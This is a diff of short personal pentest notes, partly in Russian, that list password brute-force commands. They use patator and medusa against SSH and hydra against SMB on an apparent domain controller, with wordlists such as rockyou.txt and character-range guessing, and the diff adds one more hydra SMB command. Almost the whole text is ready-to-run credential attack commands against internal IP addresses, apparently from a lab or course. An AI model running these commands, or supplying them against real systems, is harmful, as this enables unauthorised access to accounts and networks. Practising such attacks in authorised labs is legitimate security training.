@@ -7,12 +7,16 @@ patator ssh_login host=10.8.0.14 user=john password=FILE0 0=/usr/share/wordlists
 
 medusa -h 192.168.50.38 -u michael -P rockyou.txt -M ssh -f -v 6
 
-(почему то для домена) hydra -P wifite.txt -l administrator smb://192.168.50.200 -m "ROOT.DC"
+(почему то для домена) 
+
+hydra -P wifite.txt -l administrator smb://192.168.50.200 -m "ROOT.DC"
 
 
 !!!!Brute char!!!! -x min:max:Aa1%
 
 hydra -x 7:8:1 -l administrator smb://192.168.50.200 -m "ROOT.DC" -V
+
+hydra -L ~/wordlists/user.txt -P ~/wordlists/pass.txt 192.168.1.5 smb -V
 
 метасплойт в метасплойт
 
